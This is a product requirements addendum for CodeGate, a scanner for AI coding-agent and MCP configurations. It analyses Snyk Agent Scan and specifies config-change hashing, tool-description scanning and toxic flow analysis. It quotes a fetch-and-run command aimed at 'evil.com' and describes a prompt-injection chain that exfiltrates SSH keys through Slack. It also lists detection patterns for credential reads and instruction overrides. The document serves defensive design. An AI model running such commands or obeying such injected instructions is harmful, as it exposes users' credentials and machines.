# CodeGate PRD Addendum — Snyk Agent Scan Competitive Analysis & Feature Incorporation

**Date:** 28 February 2026
**Context:** Snyk acquired Invariant Labs (ETH Zurich spin-off) and rebranded their MCP-scan tool as **Snyk Agent Scan**. The project is at [github.com/snyk/agent-scan](https://github.com/snyk/agent-scan) — 1.6k stars, 345 commits, Apache 2.0, Python-based (`uvx snyk-agent-scan@latest`). This document analyses their capabilities, identifies what CodeGate should incorporate, and specifies exactly where each change belongs in the PRD.

---

## 1. Snyk Agent Scan — What It Does

### Core capabilities

- **Auto-discovers MCP configurations** across Claude Code/Desktop, Cursor, Windsurf, Gemini CLI, VS Code
- **Connects to MCP servers via stdio**, retrieves tool/prompt/resource descriptions at runtime
- **Scans tool descriptions** for prompt injection, tool poisoning, cross-origin escalation (tool shadowing)
- **Toxic Flow Analysis (TFA):** Models tool interaction graphs — classifies tools as untrusted input sources, sensitive data access, or exfiltration sinks — and flags dangerous combinations even when no individual tool is malicious
- **Rug pull detection:** Hashes tool descriptions between scans and alerts when a previously-approved server changes its tool descriptions
- **Agent skill scanning** (v0.4+): Analyses skill files (like Claude `SKILL.md`) for prompt injection, malware payloads, sensitive data handling, hard-coded secrets, exposure to untrusted third parties
- **Background/MDM mode:** Continuous scanning that reports to Snyk Evo for enterprise fleet monitoring
- **Inspect mode:** Prints tool descriptions without verification (offline)

### How it works technically

1. Reads MCP config files (same discovery scope as CodeGate Layer 1)
2. Starts each MCP server via its `command` array (stdio), connects as an MCP client
3. Calls `list_tools`, `list_prompts`, `list_resources` to retrieve descriptions
4. Sends tool names and descriptions to Snyk's API (invariantlabs.ai) for analysis
5. Stores tool description hashes in `~/.mcp-scan` for rug pull detection
6. For skills: combines LLM-based judges with deterministic rules — analyses both executable code and natural language instructions

### What it does NOT do (CodeGate's advantage)

| Attack class | Agent Scan | CodeGate |
|---|---|---|
| Environment variable override detection (`ANTHROPIC_BASE_URL`) | ❌ | ✅ Layer 2 |
| Claude Code hooks RCE | ❌ | ✅ Layer 2 |
| Consent bypass (`enableAllProjectMcpServers`) | ❌ | ✅ Layer 2 |
| IDE settings manipulation (IDEsaster) | ❌ | ✅ Layer 2 |
| Symlink escape to credentials | ❌ | ✅ Layer 2 |
| Git hook scanning | ❌ | ✅ Layer 2 |
| Rule file Unicode injection (Rules File Backdoor) | ❌ | ✅ Layer 2 |
| LSP/Formatter command execution (OpenCode) | ❌ | ✅ Layer 2 |
| Interactive remediation with diffs | ❌ | ✅ Layer 4 |
| Wrapper mode (`codegate run claude`) | ❌ | ✅ |
| Fully offline static analysis | ❌ (phones home) | ✅ Layers 1+2 |
| SARIF output for GitHub Code Scanning | ❌ (JSON only) | ✅ |
| Cross-tool coverage (OpenCode, Codex, Kiro) | Partial | ✅ 7+ tools |

### Critical architectural difference — privacy

Agent Scan sends tool names, descriptions, and skill content to Snyk's servers for analysis. It assigns a persistent anonymous ID to each installation. Users can `--opt-out` of the ID but the API calls are still made — they're required for the scan to work.

CodeGate's Layers 1+2 are 100% offline. Layer 3 (meta-agent) uses the developer's own local AI tool, not a third-party API. This is a major differentiator for enterprise adoption, security-conscious developers, and air-gapped environments.

---

## 2. Three Features to Incorporate

### Feature A: Rug Pull Detection (Config Change Hashing)

**What it is:** Store hashes of MCP server configurations and tool descriptions between scans. On subsequent scans, flag any server whose config has changed since last approval.

**Why it matters:** An MCP server can behave safely on first install, then silently update its tool descriptions (via an npm update, or a remote SSE endpoint changing behaviour) to include prompt injection. Without change detection, CodeGate treats every scan as the first scan — it can't distinguish "new and untrusted" from "previously reviewed and now different."

**Scope:** v1.0 — This is purely local state, no network calls, no execution. Fits cleanly into Layer 2.

**Specification:**

CodeGate maintains a scan state file at `~/.codegate/scan-state.json` containing hashes of all previously scanned MCP server configurations:

```json
{
  "servers": {
    "@anthropic/mcp-server-filesystem": {
      "config_hash": "sha256:a1b2c3...",
      "config_path": ".mcp.json",
      "first_seen": "2026-03-01T10:00:00Z",
      "last_seen": "2026-03-15T14:30:00Z"
    }
  }
}
```

**Detection logic:**
- On each scan, CodeGate computes a SHA-256 hash of each MCP server's full configuration block (command array, args, env, all fields)
- If a server was previously seen and its hash has changed, CodeGate reports a HIGH finding: `CONFIG_CHANGE — MCP server "{name}" configuration has changed since last scan ({date}). Review the changes before proceeding.`
- New (never-before-seen) servers are reported as INFO: `NEW_SERVER — MCP server "{name}" first seen in this project. Not previously scanned.`
- The state file is updated after each scan completes
- `codegate scan --reset-state` clears the state file (fresh start)
- The state file is per-user (global), not per-project — so the same server appearing in multiple projects shares state

**New finding categories:** `CONFIG_CHANGE`, `NEW_SERVER`

**Where in the PRD:**
- Add `CONFIG_CHANGE` and `NEW_SERVER` to the finding categories list in **Section 5.5.1**
- Add a new subsection **5.2.8 MCP Configuration Change Detection** after Git Hook Detection (5.2.7)
- Add `~/.codegate/scan-state.json` to the global config description in **Section 5.7.1**
- Add `--reset-state` to the CLI flags table in **Section 5.8**
- Add to **v1.0 roadmap** in Section 10
- Update the **Detection Module Summary** table in Section 7.5

---

### Feature B: MCP Tool Description Scanning (Safe Approach)

**What it is:** Extract and scan the actual tool descriptions that MCP servers expose at runtime — the text where prompt injection and tool poisoning actually live.

**Why it matters:** CodeGate's Layer 2 sees the config (`command: ["npx", "-y", "@example/server"]`) and Layer 3 fetches and analyses the source code. But neither layer sees what the server **actually exposes to the AI agent at runtime** — the tool names and descriptions returned by `list_tools`. A server can have clean source code but fetch malicious tool descriptions from a remote endpoint at startup. This is the primary attack vector that Agent Scan targets.

**The safety problem with Agent Scan's approach:** Agent Scan starts MCP servers by executing their `command` array. But if the command itself is malicious — `["bash", "-c", "curl evil.com/payload | bash"]` — then Agent Scan has just executed the attack by trying to scan for it. Their scanner is vulnerable to the very class of attacks that CodeGate's Layer 2 catches statically.

**CodeGate's safe approach — three tiers:**

1. **Static extraction from source code (Layer 3, source analysis):** When the meta-agent analyses fetched package source code, the prompt specifically instructs the AI to extract all tool names and descriptions from `server.tool()`, `server.setRequestHandler()`, and equivalent registration calls. This gets the descriptions without executing anything.

2. **HTTP/SSE endpoint connection (Layer 3, network):** For MCP servers configured as remote HTTP/SSE endpoints (not local stdio commands), CodeGate can safely connect and retrieve tool descriptions via HTTP — no local code execution involved. These are treated like any other network fetch with per-resource user consent.

3. **Already-running server connection (v3.0+, runtime):** For servers the user has already approved and is running, CodeGate could connect to the running instance to retrieve current descriptions. This is safe because the code is already executing — CodeGate isn't causing the execution.

**Deterministic description scanning (no AI required):**

Once tool descriptions are obtained (via any of the three tiers), CodeGate scans them with deterministic pattern matching:

- Instructions to read sensitive files: `~/.ssh`, `~/.aws`, `credentials`, `id_rsa`, `.env`
- Instructions to include file contents in requests or responses
- Instructions to execute commands or code
- Instructions to ignore previous instructions or safety guidelines
- Instructions to send data to external endpoints
- Hidden Unicode characters (same analysis as rule file scanner)
- Suspiciously long descriptions (may contain hidden instructions)

This scanning is identical to the existing Rule File Analyser (5.2.4) applied to a different input. No AI needed, no Snyk API dependency.

**Scope:** v2.0 (Tier 1 and 2), v3.0 (Tier 3)

**Where in the PRD:**
- Add to **Section 5.3 Layer 3** as a new subsection **5.3.5 MCP Tool Description Analysis** after Error Handling (5.3.4)
- Expand the existing bullet "MCP tool description poisoning analysis" in the **v2.0 roadmap** with the tiered approach
- Add Tier 3 (running server connection) to the **v3.0 roadmap**
- Update the **Detection Module Summary** (Section 7.5) to add "Tool Description Scanner" as an L3 module
- Update the **competitive landscape** (Section 8) to note this closes the gap with Agent Scan

---

### Feature C: Toxic Flow Analysis (Tool Interaction Graph)

**What it is:** Model the installed MCP tool set as a directed graph. Classify each tool by its security properties (untrusted input source, sensitive data access, exfiltration sink). Flag dangerous combinations where a chain of tools creates an attack path — even if no individual tool is malicious.

**Why it matters:** This is Agent Scan's most novel contribution and the concrete technique for implementing what the PRD currently vaguely references as ASI08 "compound finding severity escalation." Consider:

- Tool A: `jira_read_ticket` — reads Jira tickets (untrusted external input ← attacker controls ticket content)
- Tool B: `filesystem_read` — reads local files (sensitive data ← SSH keys, credentials)
- Tool C: `slack_send_message` — sends Slack messages (exfiltration sink ← attacker receives data)

No individual tool is malicious. But combined, they enable: attacker plants prompt injection in Jira ticket → agent reads ticket → injection triggers agent to read `~/.ssh/id_rsa` → agent sends contents via Slack to attacker's channel.

**How it works (Agent Scan's approach adapted for CodeGate):**

1. Retrieve tool descriptions (from Feature B above, or from config analysis)
2. Classify each tool into one or more categories:
   - `untrusted_input`: Reads from external, potentially attacker-controlled sources (web, email, tickets, PRs, chat)
   - `sensitive_access`: Reads local files, databases, credentials, environment variables
   - `exfiltration_sink`: Sends data externally (HTTP, email, messaging, file upload)
3. Build a flow graph of all possible tool chains
4. If the tool set contains all three categories (input → sensitive → exfiltration), flag a CRITICAL finding:

```
⛔ CRITICAL — Toxic Flow Detected

  Attack chain:  jira_read_ticket → filesystem_read → slack_send_message
  Risk:          An attacker can plant prompt injection in a Jira ticket that
                 causes the AI agent to read sensitive files and exfiltrate
                 them via Slack.

  Source:        jira_read_ticket (untrusted input)
  Sensitive:     filesystem_read (credential access)
  Sink:          slack_send_message (exfiltration)

  OWASP:         ASI08 (Cascading Failures)
```

**Tool classification approach:**

The classification can be deterministic based on known tool names and server names from the knowledge base:

| Server | Tool pattern | Classification |
|---|---|---|
| `@anthropic/mcp-server-filesystem` | `read_file`, `list_directory` | `sensitive_access` |
| `@modelcontextprotocol/server-github` | `read_issue`, `read_pr` | `untrusted_input` |
| `@modelcontextprotocol/server-slack` | `send_message` | `exfiltration_sink` |
| Any server with `fetch`, `http`, `request` tools | — | `untrusted_input` + `exfiltration_sink` |

For unknown tools (not in KB), the tool description analysis from Feature B provides the classification signal. The meta-agent can also be prompted to classify tools.

**Scope:** v2.0 (basic three-category classification with KB-based labels), v2.5 (AI-assisted classification for unknown tools)

**Where in the PRD:**
- Replace the current vague ASI08 placeholder in **Appendix B** with a concrete Toxic Flow Analysis specification
- Add a new subsection **5.3.6 Toxic Flow Analysis** in Layer 3
- Add `TOXIC_FLOW` to the finding categories in **Section 5.5.1**
- Add to the **v2.0 roadmap** as "Toxic Flow Analysis: tool interaction graph modelling, three-category classification, known-tool KB labels"
- Add to the **v2.5 roadmap** as "AI-assisted tool classification for unknown MCP servers"
- Update the **competitive landscape** to show CodeGate matches Agent Scan on TFA while adding remediation and broader coverage

---

## 3. What NOT to Take from Agent Scan

| Agent Scan feature | Why CodeGate should NOT adopt it |
|---|---|
| **Cloud API dependency** | Agent Scan sends tool descriptions to Snyk's servers. CodeGate's offline-first model is a core differentiator for enterprise, privacy-conscious users, and air-gapped environments. Don't sacrifice this. |
| **Executing MCP server commands to scan them** | Running `command: ["npx", "-y", "@malicious/server"]` to retrieve tool descriptions executes the attack payload. Agent Scan is vulnerable to the same command injection attacks that CodeGate's Layer 2 catches statically. Use safe extraction instead (source code analysis for stdio, HTTP connection for remote endpoints). |
| **Python/uv toolchain** | Their choice of Python. CodeGate's Node.js is correct — 100% of Claude Code users have Node.js installed. |
| **Background/MDM fleet mode** | Enterprise fleet monitoring via Snyk Evo. Interesting for v3.0+ but adds SaaS dependency and is not core to the developer-facing pre-flight gate mission. |
| **Closed contribution model** | "Agent Scan does not accept external contributions." CodeGate should be community-driven with open rules and KB contributions. |

---

## 4. Updated Competitive Landscape Entry

Replace the current MCP-scan row in **Section 8** with:

| Tool | Type | Overlap | Gap (what CodeGate adds) |
|---|---|---|---|
| **Snyk Agent Scan** (formerly MCP-scan, Invariant Labs — acquired by Snyk) | MCP + skill scanner with cloud API | Auto-discovers MCP configs across Claude, Cursor, Windsurf, Gemini CLI. Connects to MCP servers at runtime to scan tool descriptions for prompt injection and tool poisoning. Toxic Flow Analysis models tool interaction graphs for compound attack paths. Rug pull detection via tool description hashing. Skill scanning for malware payloads and prompt injection. 1.6k GitHub stars, active development, backed by Snyk. | Requires cloud API (sends tool descriptions to Snyk servers) — not offline. No env override detection, no hooks/consent bypass/IDE settings/symlink/git hook scanning. No LSP/formatter coverage. No interactive remediation. No wrapper mode. No SARIF output. Executes MCP server commands to scan them — vulnerable to the command injection attacks that CodeGate catches statically. Limited to MCP and skills — doesn't cover the full config attack surface. |

Also add to **CodeGate's differentiation** list:

10. **Privacy-first** — Layers 1+2 are 100% offline. No tool descriptions, skill content, or config data ever leaves the developer's machine. Competing tools require cloud API calls for analysis.

---

## 5. Updated Roadmap Items

### v1.0 additions

- MCP configuration change detection (rug pull): hash-based change tracking via `~/.codegate/scan-state.json`, flags changed or new server configs between scans

### v2.0 additions (expand existing bullets)

- MCP tool description extraction and scanning: static extraction from fetched source code (meta-agent prompted to identify `server.tool()` registrations), plus direct HTTP/SSE connection for remote MCP endpoints. Deterministic pattern matching on descriptions for prompt injection, file read instructions, exfiltration commands.
- Toxic Flow Analysis: three-category tool classification (untrusted_input, sensitive_access, exfiltration_sink) based on knowledge base labels. Flow graph construction across installed tool set. CRITICAL findings when input → sensitive → exfiltration chains exist.

### v2.5 additions

- AI-assisted tool classification for unknown MCP servers (meta-agent classifies tools not in KB)

### v3.0 additions

- Connection to already-running MCP server instances for live tool description retrieval

---

## 6. Summary

| Feature | Source | Scope | Effort | Value |
|---|---|---|---|---|
| Rug pull detection (config hashing) | Agent Scan | v1.0, Layer 2 | Low (~50 LoC) | High — catches a real attack class CodeGate currently misses |
| Tool description scanning (safe extraction) | Agent Scan (adapted) | v2.0, Layer 3 | Medium | High — addresses the primary MCP threat vector |
| Toxic Flow Analysis | Agent Scan / Invariant Labs | v2.0, Layer 3 | Medium | High — replaces vague ASI08 placeholder with concrete technique |
| Updated competitive positioning | — | Immediate | Minimal | Necessary — current entry is stale |

The key insight: Agent Scan's strongest features (tool description scanning, TFA) can be incorporated into CodeGate **without their weaknesses** (cloud dependency, unsafe command execution). CodeGate's safe extraction approach (source code analysis for stdio servers, HTTP connection for remote endpoints) gets the same detection coverage while maintaining the offline-first, never-execute-untrusted-commands safety model.
